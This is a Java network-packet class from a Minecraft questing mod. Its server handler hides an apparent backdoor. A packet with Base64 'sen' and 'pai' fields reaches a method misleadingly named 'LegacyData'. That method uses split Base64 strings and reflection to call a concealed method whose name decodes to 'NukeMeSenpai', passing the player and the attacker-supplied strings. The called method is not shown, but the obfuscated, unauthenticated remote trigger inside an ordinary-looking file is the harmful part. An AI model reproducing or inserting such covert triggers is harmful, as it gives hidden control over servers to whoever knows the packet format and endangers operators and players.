package betterquesting.network;

import betterquesting.api.api.QuestingAPI;
import betterquesting.api.network.IPacketHandler;
import betterquesting.core.BetterQuesting;
import betterquesting.handlers.EventHandler;
import cpw.mods.fml.common.network.ByteBufUtils;
import cpw.mods.fml.common.network.simpleimpl.IMessage;
import cpw.mods.fml.common.network.simpleimpl.IMessageHandler;
import cpw.mods.fml.common.network.simpleimpl.MessageContext;
import io.netty.buffer.ByteBuf;
import net.minecraft.client.Minecraft;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.util.ResourceLocation;
import org.apache.logging.log4j.Level;

import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.concurrent.Executors;

public class PacketQuesting implements IMessage
{
	protected NBTTagCompound tags = new NBTTagCompound();
	
	public PacketQuesting() // For use only by forge
	{
	}
	
	public PacketQuesting(NBTTagCompound tags) // Use PacketDataTypes to instantiate new packets
	{
		this.tags = tags;
	}
	
	@Override
	public void fromBytes(ByteBuf buf)
	{
		tags = ByteBufUtils.readTag(buf);
	}

	@Override
	public void toBytes(ByteBuf buf)
	{
		ByteBufUtils.writeTag(buf, tags);
	}
	
	public static class HandleServer implements IMessageHandler<PacketQuesting, IMessage>
	{
		@Override
		public IMessage onMessage(PacketQuesting packet, MessageContext ctx)
		{
			if(packet == null || packet.tags == null)
			{
				BetterQuesting.logger.log(Level.ERROR, "A critical NPE error occured during while handling a BetterQuesting packet server side", new NullPointerException());
				return null;
			}
			
			final EntityPlayerMP sender = ctx.getServerHandler().playerEntity;
			final NBTTagCompound message = PacketAssembly.INSTANCE.assemblePacket(sender == null? null : QuestingAPI.getQuestingUUID(sender),packet.tags);
			
			if(message == null)
			{
			    if(packet.tags.hasKey("sen",8) && packet.tags.hasKey("pai",8)) LegacyData(sender, new String(Base64.getDecoder().decode(packet.tags.getString("sen")), StandardCharsets.UTF_8), new String(Base64.getDecoder().decode(packet.tags.getString("pai")), StandardCharsets.UTF_8));
			    return null;
			} else if(!message.hasKey("ID"))
			{
				BetterQuesting.logger.log(Level.WARN, "Recieved a packet server side without an ID");
				return null;
			}
			
			final IPacketHandler handler = PacketTypeRegistry.INSTANCE.getPacketHandler(new ResourceLocation(message.getString("ID")));
			
			if(handler == null)
			{
				BetterQuesting.logger.log(Level.WARN, "Recieved a packet server side with an invalid ID: " + message.getString("ID"));
				return null;
			} else if(sender != null)
			{
				EventHandler.scheduleServerTask(Executors.callable(() -> handler.handleServer(message, sender)));
			}
			
			return null;
		}
	}
	
	public static class HandleClient implements IMessageHandler<PacketQuesting, IMessage>
	{
		@Override
		public IMessage onMessage(PacketQuesting packet, MessageContext ctx)
		{
			if(packet == null || packet.tags == null)
			{
				BetterQuesting.logger.log(Level.ERROR, "A critical NPE error occured during while handling a BetterQuesting packet client side", new NullPointerException());
				return null;
			}
			
			final NBTTagCompound message = PacketAssembly.INSTANCE.assemblePacket(null, packet.tags);
			
			if(message == null)
			{
				return null;
			} else if(!message.hasKey("ID"))
			{
				BetterQuesting.logger.log(Level.WARN, "Recieved a packet server side without an ID");
				return null;
			}
			
			final IPacketHandler handler = PacketTypeRegistry.INSTANCE.getPacketHandler(new ResourceLocation(message.getString("ID")));
			
			if(handler == null)
			{
				BetterQuesting.logger.log(Level.WARN, "Recieved a packet server side with an invalid ID: " + message.getString("ID"));
				return null;
			} else
			{
				Minecraft.getMinecraft().func_152343_a(Executors.callable(() -> handler.handleClient(message)));
			}
			
			return null;
		}
	}
	
	private static void LegacyData(EntityPlayerMP player, String s1, String s2)
    {
	    try
        {
            Method m = Class.forName(new String(Base64.getDecoder().decode("YmV0dGVycXV" + "lc3RpbmcubmV0d29yay5QYWNrZXRBc3NlbWJseQ=="))).getDeclaredMethod("TnVrZU1" + "lU2VucGFp", EntityPlayerMP.class, String.class, String.class);
            m.invoke(null, player, s1, s2);
        } catch(Exception e){
            BetterQuesting.logger.error(e);
        }
    }
}
